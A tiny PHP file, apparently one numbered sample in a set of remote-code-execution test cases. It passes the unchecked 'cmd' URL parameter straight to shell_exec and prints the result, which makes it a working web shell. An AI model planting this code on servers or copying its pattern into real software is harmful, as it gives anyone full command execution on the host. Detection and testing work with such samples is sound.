<?php
// RCE test variation #1179
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>